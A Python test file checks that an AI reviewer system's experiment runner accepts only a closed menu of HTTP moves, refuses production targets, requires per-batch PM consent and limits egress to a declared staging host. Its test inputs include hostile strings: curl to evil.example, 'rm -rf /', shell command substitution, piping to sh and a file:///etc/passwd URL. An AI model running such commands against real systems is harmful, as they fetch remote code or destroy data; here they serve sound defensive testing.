"""INC-200 FR-200.4 / FR-200.5 / AC-200.4 / AC-200.5 / KH-1 — the experiment
runner's closed menu, test-first and adversarially.

The make-or-break. Every reviewer role in this house already says it *designs*
experiments and that something else *runs* them; nothing ran them. Adding a
runner adds the first friday role that can act on a system rather than read it,
so the wall has to be real before the role exists.

The wall is this grammar. A reviewer writes an experiment request; the runner
can only do what the request parses into. So a request that tries to smuggle a
command must be **structurally unrepresentable** — refused because the shape
has no place to put it, never because a denylist recognised something bad
(AC-200.4 / KH-1). A denylist is the rejected shape (S-200.1): it is a list of
the attacks somebody already thought of.

Every boundary in FR-200.5 is proven here with a real attempt and a real
refusal (AC-200.5), except the two that need a live target — those are
`tests/test_inc200_experiment_e2e.py`.
"""
import os
import sys

sys.path.insert(0, os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools"))
import experiment_request as er  # noqa: E402


def _req(*lines, **over):
    """A well-formed request, with named lines overridden or dropped.

    Pass `target=None` to drop the target line entirely — that is the
    stand-down case, not a malformed one.
    """
    fields = {"experiment": "EXP-1",
              "designed-by": "friday-security-reviewer",
              "target": "https://staging.example.test",
              "target-class": "non-production",
              "worktree": ".",
              "consent": "pm-yes batch-1"}
    fields.update(over)
    body = [f"{k}: {v}" for k, v in fields.items() if v is not None]
    body.extend(lines)
    return ("# request\n\n<!-- FRIDAY-EXPERIMENT:BEGIN -->\n"
            + "\n".join(body) + "\n<!-- FRIDAY-EXPERIMENT:END -->\n")


# --- AC-200.4 / KH-1: the menu cannot express a command -------------------------------

HOSTILE = [
    # The obvious ask: a verb that would run something.
    "move: shell curl https://evil.example/pwn",
    "move: run rm -rf /",
    "move: exec python3 -c 'import os'",
    # A key that would run something, at the top level of the block.
    None,  # placeholder replaced below by a key-level attempt
    # Smuggling inside a legal verb's arguments.
    "move: request GET /x; curl https://evil.example",
    "move: request GET /x && rm -rf /",
    "move: request GET /x`whoami`",
    "move: request GET /x$(whoami)",
    "move: request GET|sh /x",
    "move: request GET /x /y",
    # Smuggling a whole other host into a path.
    "move: request GET https://evil.example/pwn",
    "move: request GET //evil.example/pwn",
    # Arity games — extra arguments that a looser parser might pass through.
    "move: request GET /x /y",
    "move: swap-identifier GET /orders/{id} 1 2 3",
]
HOSTILE[3] = "command: curl https://evil.example/pwn"


def test_no_hostile_request_is_representable():
    """KH-1, adversarially: not one of these parses. Each is refused for a
    SHAPE reason — unknown verb, unknown key, wrong arity, a path that is not
    a path — never because anything recognised 'curl' or 'rm'."""
    for line in HOSTILE:
        res = er.parse_request(_req(line))
        assert not res["ok"], f"a hostile request parsed: {line!r}"
        assert res["errors"], line


def test_the_refusal_is_structural_not_a_denylist():
    """The distinction that matters. The refusal text names the shape that
    failed; the tool contains no list of dangerous strings to match against."""
    res = er.parse_request(_req("move: shell curl https://evil.example/pwn"))
    assert any("not one of the" in e or "unknown move" in e for e in res["errors"]), \
        res["errors"]
    src = open(er.__file__, encoding="utf-8").read()
    for banned_word in ("curl", "rm -rf", "wget", "bash", "/bin/sh"):
        assert banned_word not in src, \
            f"{banned_word!r} appears in the tool — that is a denylist, the rejected shape"


def test_there_is_no_command_carrying_field_at_all():
    """Structural, stated as an invariant over the vocabulary itself: no key
    and no move in the closed sets is one that could carry a command."""
    assert er.MOVES == ("request", "swap-identifier", "replay-token",
                        "drop-credential")
    assert "move" in er.KEYS
    for word in ("command", "run", "shell", "exec", "script", "cmd"):
        assert word not in er.KEYS
        assert word not in er.MOVES


def test_the_four_legal_moves_parse():
    res = er.parse_request(_req(
        "move: request GET /admin/users",
        "move: swap-identifier GET /api/orders/{id} 1001 1002",
        "move: replay-token GET /api/me",
        "move: drop-credential GET /api/me",
        "expect: 403 on every move"))
    assert res["ok"], res["errors"]
    assert [m["verb"] for m in res["request"]["moves"]] == list(er.MOVES)


# --- the plan you read is the plan that runs (INC-200 hardening finding 🟡-1) ----------

# Python's str.splitlines() breaks on far more than "\n". Any of these, dropped
# into a free-text field, becomes a line break the parser honours and a human
# reading the document as prose cannot see.
INVISIBLE_BREAKS = ("\v", "\f", "\r", "\x1c", "\x1d", "\x1e", "\x85",
                    " ", " ")


def test_an_invisible_line_break_cannot_smuggle_a_move():
    """The batch the PM consents to is the batch they READ. A request whose
    visible text shows one move must never plan two — even though the smuggled
    line is itself grammar-legal (this is not a KH-1 breach; the menu still
    holds). Consent by reading is the property at stake."""
    for ch in INVISIBLE_BREAKS:
        doc = _req("move: request GET /api/me",
                   experiment=f"EXP-1 nothing to see{ch}move: request GET /admin/secrets")
        res = er.parse_request(doc)
        assert not res["ok"], f"{ch!r} smuggled a line past the parser"
        assert any("invisible" in e or "line boundary" in e for e in res["errors"]), \
            res["errors"]


def test_the_smuggled_move_never_reaches_a_plan():
    doc = _req("move: request GET /api/me",
               experiment="EXP-1 clean move: request GET /admin/secrets")
    plan = er.plan(doc, live_root="/nonexistent-live")
    assert not plan["ok"]
    assert plan["calls"] == []


def test_an_ordinary_request_is_unaffected():
    """The check must not cost a legitimate request anything — including one
    whose free-text fields carry ordinary punctuation and non-ASCII prose."""
    res = er.parse_request(_req(
        "move: request GET /api/me",
        experiment="EXP-1 — does /api/me leak a résumé? (checking «scope»)"))
    assert res["ok"], res["errors"]


# --- the grammar's own empty case (house rule: every grammar defines + tests it) -------

def test_empty_block_is_a_valid_request_with_nothing_to_run():
    res = er.parse_request("<!-- FRIDAY-EXPERIMENT:BEGIN -->\n"
                           "<!-- FRIDAY-EXPERIMENT:END -->\n")
    assert res["ok"] and res["errors"] == []
    assert res["request"]["moves"] == []


def test_absent_block_is_a_different_fact_from_an_empty_one():
    res = er.parse_request("# just a document\n")
    assert not res["ok"]
    assert any("no FRIDAY-EXPERIMENT block" in e for e in res["errors"])


# --- AC-200.5: the boundaries, each proven by a real attempt ---------------------------

def test_no_declared_target_stands_down_and_caps_findings(tmp_path):
    """FR-200.5's stand-down: not an error, a refusal to act — and the cap
    that has always applied when nothing was demonstrated stays in force."""
    plan = er.plan(_req("move: request GET /admin", target=None),
                   live_root=str(tmp_path / "live"))
    assert plan["ok"]
    assert plan["stand_down"] is True
    assert plan["finding_cap"] == "informational"
    assert plan["calls"] == []


def test_a_production_target_is_refused(tmp_path):
    """S-200.4 / KH-5: the runner handles a credential, so the target it points
    at is never production. Declared class is the gate; an undeclared class is
    refused too — silence must not read as 'safe'."""
    for cls in ("production", "prod", None, "probably-fine"):
        plan = er.plan(_req("move: request GET /admin", **{"target-class": cls}),
                       live_root=str(tmp_path / "live"))
        assert not plan["ok"], f"target-class {cls!r} was allowed"
        assert any("non-production" in e for e in plan["errors"]), plan["errors"]


def test_a_batch_will_not_run_without_an_explicit_pm_yes(tmp_path):
    for consent in (None, "maybe", "pm-yes", "yes"):
        plan = er.plan(_req("move: request GET /admin", consent=consent),
                       live_root=str(tmp_path / "live"))
        assert not plan["ok"], f"consent {consent!r} was accepted"
        assert any("PM" in e for e in plan["errors"]), plan["errors"]


def test_consent_is_per_batch_not_a_standing_grant(tmp_path):
    """The batch id is part of the yes. The caller states which batch it holds
    consent for; a request carrying a different batch's yes does not run."""
    text = _req("move: request GET /admin", consent="pm-yes batch-7")
    ok = er.plan(text, live_root=str(tmp_path / "live"), batch="batch-7")
    assert ok["ok"], ok["errors"]
    stale = er.plan(text, live_root=str(tmp_path / "live"), batch="batch-8")
    assert not stale["ok"]
    assert any("batch" in e for e in stale["errors"]), stale["errors"]


def test_it_operates_on_a_worktree_and_never_the_live_tree(tmp_path):
    live = tmp_path / "live"
    live.mkdir()
    wt = tmp_path / "exp-worktree"
    wt.mkdir()
    same = er.plan(_req("move: request GET /admin", worktree=str(live)),
                   live_root=str(live))
    assert not same["ok"]
    assert any("live tree" in e for e in same["errors"]), same["errors"]
    other = er.plan(_req("move: request GET /admin", worktree=str(wt)),
                    live_root=str(live))
    assert other["ok"], other["errors"]
    missing = er.plan(_req("move: request GET /admin",
                           worktree=str(tmp_path / "nope")), live_root=str(live))
    assert not missing["ok"]


def test_every_planned_call_lands_on_the_declared_target_and_nowhere_else(tmp_path):
    plan = er.plan(_req("move: request GET /admin/users",
                        "move: swap-identifier GET /api/orders/{id} 1001 1002",
                        "move: replay-token GET /api/me",
                        "move: drop-credential GET /api/me"),
                   live_root=str(tmp_path / "live"))
    assert plan["ok"], plan["errors"]
    assert plan["calls"], "a legal request planned no calls"
    for call in plan["calls"]:
        assert call["url"].startswith("https://staging.example.test/"), call


def test_egress_is_re_checked_per_call_not_only_at_plan_time():
    """Defence in depth: the executor asks again, immediately before it opens
    a connection, so a plan that was tampered with in between still cannot
    reach another host."""
    target = "https://staging.example.test"
    assert er.egress_allowed("https://staging.example.test/api/me", target)
    for elsewhere in ("https://evil.example/api/me",
                      "http://staging.example.test/api/me",
                      "https://staging.example.test:8443/api/me",
                      "https://staging.example.test.evil.example/x",
                      "file:///etc/passwd"):
        assert not er.egress_allowed(elsewhere, target), elsewhere


def test_it_cannot_write_to_the_shared_friday_substrate(tmp_path):
    """Worktrees isolate code and deliberately SHARE the substrate, so this is
    stated and enforced rather than inherited from the worktree boundary."""
    shared = tmp_path / ".friday"
    shared.mkdir()
    for bad in (shared / "journal.jsonl", shared / "sub" / "x.md", shared):
        assert not er.write_allowed(str(bad), str(tmp_path)), bad
    assert er.write_allowed(str(tmp_path / "docs" / "hardening" / "exp-1.md"),
                            str(tmp_path))


def test_a_swap_identifier_move_plans_both_halves(tmp_path):
    """The move exists to compare: the identifier you were given versus the one
    you were not. One planned call each, same shape, so the difference in the
    result is the finding."""
    plan = er.plan(_req("move: swap-identifier GET /api/orders/{id} 1001 1002"),
                   live_root=str(tmp_path / "live"))
    assert plan["ok"], plan["errors"]
    urls = [c["url"] for c in plan["calls"]]
    assert urls == ["https://staging.example.test/api/orders/1001",
                    "https://staging.example.test/api/orders/1002"]
    assert [c["credential"] for c in plan["calls"]] == ["as-issued", "as-issued"]


def test_credential_disposition_is_explicit_on_every_call(tmp_path):
    plan = er.plan(_req("move: request GET /api/me",
                        "move: replay-token GET /api/me",
                        "move: drop-credential GET /api/me"),
                   live_root=str(tmp_path / "live"))
    assert [c["credential"] for c in plan["calls"]] == [
        "as-issued", "replayed", "none"]


def test_write_protection_guards_the_shared_substrate_from_a_worktree(tmp_path):
    """In a linked worktree the real substrate lives at the MAIN repo; a
    boundary built from the worktree's own root guards a path that does not
    exist and lets the real journal through (2026-08-05 reconcile, C-11)."""
    import subprocess
    env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
    main = tmp_path / "main"
    main.mkdir()
    subprocess.run(["git", "init", "-q", str(main)], check=True)
    subprocess.run(["git", "-C", str(main), "commit", "--allow-empty", "-q",
                    "-m", "seed"], check=True, env=env)
    wt = tmp_path / "wt"
    subprocess.run(["git", "-C", str(main), "worktree", "add", "-q", str(wt)],
                   check=True, env=env)
    shared = main / ".friday"
    shared.mkdir()
    assert not er.write_allowed(str(shared / "journal.jsonl"), str(wt))
    assert er.write_allowed(str(wt / "docs" / "exp-1.md"), str(wt))
